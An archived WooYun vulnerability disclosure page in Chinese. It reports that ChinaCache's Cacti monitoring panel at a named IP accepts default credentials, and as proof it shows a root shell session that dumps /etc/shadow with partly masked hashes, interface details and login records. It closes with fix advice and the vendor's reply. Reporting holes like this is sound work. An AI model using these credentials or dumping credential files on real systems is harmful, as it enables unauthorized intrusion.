<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		ChinaCache 监控服务CACTI管理后台弱口令 (可ROOT服务器)  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		ChinaCache 监控服务CACTI管理后台弱口令 (可ROOT服务器)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/猪猪侠">猪猪侠</a> 
</li><li>提交时间：		2013-07-26 13:54</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2013-07-26：	细节已通知厂商并且等待厂商处理中<br/>
									2013-07-26：	厂商已经确认，细节仅向厂商公开<br/>
									2013-08-05：	细节向核心白帽子及相关领域专家公开<br/>
									2013-08-15：	细节向普通白帽子公开<br/>
									2013-08-25：	细节向实习白帽子公开<br/>
									2013-09-09：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">该服务器所处机房很高端，网易、搜狐、新浪、360、百度等等大厂商都有服务器在。<br />
如果被间接利用，危害是非常大的。</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">CACTI 地址：<br />
<br />
http://220.181.47.151/<br />
<br />
<br />
<br />
弱口令<br />
<br />
admin：admin<br />
<br />
guest:admin<br />
<br />
<br />
<br />
</p><p class="detail"><a href="../images/2613515436ffc24f4c8fe2ce1cd952560f4e3c3f.jpg" target="_blank"><img src="../images/2613515436ffc24f4c8fe2ce1cd952560f4e3c3f.jpg" alt="chinacache_cacti.jpg" width="600"/></a></p><p class="detail"> </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail"></p><pre><code>sh-3.2# /sbin/ifconfig -a<br />
/sbin/ifconfig -a<br />
eth0      Link encap:Ethernet  HWaddr 00:13:72:65:28:5C  <br />
          UP BROADCAST MULTICAST  MTU:1500  Metric:1<br />
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:1000 <br />
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)<br />
<br />
eth1      Link encap:Ethernet  HWaddr 00:13:72:65:28:5D  <br />
          inet addr:220.181.47.151  Bcast:220.181.47.159  Mask:255.255.255.240<br />
          inet6 addr: fe80::213:72ff:fe65:285d/64 Scope:Link<br />
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />
          RX packets:71655106 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:28384460 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0 <br />
          RX bytes:10572923065 (9.8 GiB)  TX bytes:4031517289 (3.7 GiB)<br />
<br />
lo        Link encap:Local Loopback  <br />
          inet addr:127.0.0.1  Mask:255.0.0.0<br />
          inet6 addr: ::1/128 Scope:Host<br />
          UP LOOPBACK RUNNING  MTU:16436  Metric:1<br />
          RX packets:1020776 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:1020776 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0 <br />
          RX bytes:108876144 (103.8 MiB)  TX bytes:108876144 (103.8 MiB)<br />
<br />
peth1     Link encap:Ethernet  HWaddr FE:FF:FF:FF:FF:FF  <br />
          inet6 addr: fe80::fcff:ffff:feff:ffff/64 Scope:Link<br />
          UP BROADCAST RUNNING NOARP  MTU:1500  Metric:1<br />
          RX packets:100902104 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:34752238 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:1000 <br />
          RX bytes:13784303050 (12.8 GiB)  TX bytes:4762685018 (4.4 GiB)<br />
<br />
sit0      Link encap:IPv6-in-IPv4  <br />
          NOARP  MTU:1480  Metric:1<br />
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0 <br />
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)<br />
<br />
veth0     Link encap:Ethernet  HWaddr 00:00:00:00:00:00  <br />
          BROADCAST MULTICAST  MTU:1500  Metric:1<br />
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0 <br />
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)<br />
<br />
veth2     Link encap:Ethernet  HWaddr 00:00:00:00:00:00  <br />
          BROADCAST MULTICAST  MTU:1500  Metric:1<br />
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0 <br />
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)<br />
<br />
veth3     Link encap:Ethernet  HWaddr 00:00:00:00:00:00  <br />
          BROADCAST MULTICAST  MTU:1500  Metric:1<br />
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0 <br />
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)<br />
<br />
veth4     Link encap:Ethernet  HWaddr 00:00:00:00:00:00  <br />
          BROADCAST MULTICAST  MTU:1500  Metric:1<br />
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0 <br />
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)<br />
<br />
vif0.0    Link encap:Ethernet  HWaddr FE:FF:FF:FF:FF:FF  <br />
          BROADCAST MULTICAST  MTU:1500  Metric:1<br />
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0 <br />
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)<br />
<br />
vif0.1    Link encap:Ethernet  HWaddr FE:FF:FF:FF:FF:FF  <br />
          inet6 addr: fe80::fcff:ffff:feff:ffff/64 Scope:Link<br />
          UP BROADCAST RUNNING NOARP  MTU:1500  Metric:1<br />
          RX packets:36967271 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:86224028 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0 <br />
          RX bytes:4855610108 (4.5 GiB)  TX bytes:12810458166 (11.9 GiB)<br />
<br />
vif0.2    Link encap:Ethernet  HWaddr FE:FF:FF:FF:FF:FF  <br />
          BROADCAST MULTICAST  MTU:1500  Metric:1<br />
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0 <br />
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)<br />
<br />
vif0.3    Link encap:Ethernet  HWaddr FE:FF:FF:FF:FF:FF  <br />
          BROADCAST MULTICAST  MTU:1500  Metric:1<br />
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0 <br />
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)<br />
<br />
vif0.4    Link encap:Ethernet  HWaddr FE:FF:FF:FF:FF:FF  <br />
          BROADCAST MULTICAST  MTU:1500  Metric:1<br />
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0 <br />
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)<br />
<br />
virbr0    Link encap:Ethernet  HWaddr 00:00:00:00:00:00  <br />
          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0<br />
          inet6 addr: fe80::200:ff:fe00:0/64 Scope:Link<br />
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:70 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0 <br />
          RX bytes:0 (0.0 b)  TX bytes:14808 (14.4 KiB)<br />
<br />
xenbr1    Link encap:Ethernet  HWaddr FE:FF:FF:FF:FF:FF  <br />
          UP BROADCAST RUNNING NOARP  MTU:1500  Metric:1<br />
          RX packets:54265731 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0 <br />
          RX bytes:7918369069 (7.3 GiB)  TX bytes:0 (0.0 b)<br />
<br />
sh-3.2# cat /etc/shadow<br />
cat /etc/shadow<br />
root:$1$x8z81Z1H$tTHI****egXf4AYimjO5U.:15519:0:99999:7:::<br />
bin:*:14999:0:99999:7:::<br />
daemon:*:14999:0:99999:7:::<br />
adm:*:14999:0:99999:7:::<br />
lp:*:14999:0:99999:7:::<br />
sync:*:14999:0:99999:7:::<br />
shutdown:*:14999:0:99999:7:::<br />
halt:*:14999:0:99999:7:::<br />
mail:*:14999:0:99999:7:::<br />
news:*:14999:0:99999:7:::<br />
uucp:*:14999:0:99999:7:::<br />
operator:*:14999:0:99999:7:::<br />
games:*:14999:0:99999:7:::<br />
gopher:*:14999:0:99999:7:::<br />
ftp:*:14999:0:99999:7:::<br />
nobody:*:14999:0:99999:7:::<br />
nscd:!!:14999:0:99999:7:::<br />
distcache:!!:14999:0:99999:7:::<br />
vcsa:!!:14999:0:99999:7:::<br />
ais:!!:14999:0:99999:7:::<br />
pcap:!!:14999:0:99999:7:::<br />
ntp:!!:14999:0:99999:7:::<br />
squid:!!:14999:0:99999:7:::<br />
apache:!!:14999:0:99999:7:::<br />
rpc:!!:14999:0:99999:7:::<br />
named:!!:14999:0:99999:7:::<br />
mailnull:!!:14999:0:99999:7:::<br />
smmsp:!!:14999:0:99999:7:::<br />
rpcuser:!!:14999:0:99999:7:::<br />
nfsnobody:!!:14999:0:99999:7:::<br />
sshd:!!:14999:0:99999:7:::<br />
webalizer:!!:14999:0:99999:7:::<br />
luci:!!:14999:0:99999:7:::<br />
dbus:!!:14999:0:99999:7:::<br />
avahi:!!:14999:0:99999:7:::<br />
xfs:!!:14999:0:99999:7:::<br />
hsqldb:!!:14999:0:99999:7:::<br />
ricci:!!:14999:0:99999:7:::<br />
haldaemon:!!:14999:0:99999:7:::<br />
avahi-autoipd:!!:14999:0:99999:7:::<br />
pegasus:!!:14999:0:99999:7:::<br />
gdm:!!:14999:0:99999:7:::<br />
sabayon:!!:14999:0:99999:7:::<br />
mysql:!!:15001::::::<br />
admin:$1$.XZjnzjb$b/******Dlcg/wrPWMA1l2.:15023:0:99999:7:::<br />
sh-3.2# cat /etc/hosts<br />
cat /etc/hosts<br />
# Do not remove the following line, or various programs<br />
# that require network functionality will fail.<br />
127.0.0.1               localhost.localdomain localhost<br />
::1             localhost6.localdomain6 localhost6<br />
sh-3.2# uname -a<br />
uname -a<br />
Linux localhost.localdomain 2.6.18-194.el5xen #1 SMP Fri Apr 2 15:34:40 EDT 2010 x86_64 x86_64 x86_64 GNU/Linux<br />
sh-3.2# last -20<br />
last -20<br />
admin    pts/1        61.135.207.195   Thu Jul 25 15:35 - 15:37  (00:01)    <br />
admin    pts/1        61.135.207.195   Thu Jul 11 16:12 - 16:46  (00:33)    <br />
admin    pts/1        220.181.64.20    Tue Jun 18 10:15 - 11:51  (01:35)    <br />
admin    pts/1        220.181.64.20    Sun Jun 16 23:18 - 23:30  (00:11)    <br />
admin    pts/1        220.181.64.20    Sat Jun  8 11:36 - 11:40  (00:04)    <br />
admin    pts/1        220.181.64.19    Fri Jun  7 17:15 - 18:08  (00:52)    <br />
admin    pts/1        220.181.64.20    Mon May 27 11:11 - 13:32  (02:21)    <br />
admin    pts/1        220.181.64.21    Fri May 24 13:39 - 14:06  (00:27)    <br />
admin    pts/1        220.181.64.21    Tue May 21 10:09 - 14:33  (04:23)    <br />
admin    pts/1        220.181.64.21    Sat May 18 02:39 - 03:10  (00:30)    <br />
admin    pts/1        220.181.64.21    Tue May  7 10:48 - 13:00  (02:11)    <br />
admin    pts/1        220.181.64.20    Wed Apr 17 17:45 - 17:52  (00:06)    <br />
admin    pts/1        220.181.64.20    Wed Apr 10 15:07 - 18:07  (03:00)    <br />
root     pts/1        113.31.38.21     Wed Mar 13 12:00 - 12:00  (00:00)    <br />
admin    pts/1        111.196.233.62   Sat Mar  9 13:31 - 13:32  (00:00)    <br />
admin    pts/1        220.181.64.20    Tue Feb 26 15:57 - 18:05  (02:07)    <br />
admin    pts/1        220.181.64.20    Tue Feb 26 12:06 - 15:55  (03:49)    <br />
admin    pts/1        220.181.64.20    Tue Feb 26 10:33 - 10:49  (00:15)    <br />
admin    pts/1        220.181.64.21    Thu Jan 24 11:52 - 18:01  (06:08)    <br />
admin    pts/2        220.181.64.21    Mon Jan 21 17:32 - 18:08  (00:36)    <br />
<br />
wtmp begins Wed Jan 26 03:37:41 2011<br />
sh-3.2# ping hd.360.cn -c 2<br />
ping hd.360.cn -c 2<br />
PING hd-b.360.cn (220.181.47.91) 56(84) bytes of data.<br />
64 bytes from 220.181.47.91: icmp_seq=1 ttl=62 time=0.638 ms<br />
64 bytes from 220.181.47.91: icmp_seq=2 ttl=62 time=0.619 ms<br />
<br />
--- hd-b.360.cn ping statistics ---<br />
2 packets transmitted, 2 received, 0% packet loss, time 5001ms<br />
rtt min/avg/max/mdev = 0.619/0.628/0.638/0.026 ms<br />
sh-3.2#</code></pre><p class='detail'> </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">#1 CACTI 管理地址做严格的访问控制规则<br />
<br />
#2 杜绝默认口令。 </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/猪猪侠" title="猪猪侠">猪猪侠</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-032391" title="ChinaCache 监控服务CACTI管理后台弱口令 (可ROOT服务器)">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：低</p>
						<p class="detail">漏洞Rank：5 </p>
													<p class="detail">确认时间：2013-07-26 17:18</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">感谢 @猪猪侠 提报的安全漏洞。<br />
由于该设备不属于重要系统，不会对蓝汛造成重大安全影响，因此根据乌云 Rand 评级制度给予“低”的评价，但给予“低”的最高分值 5 分表示感谢。</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="32391";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
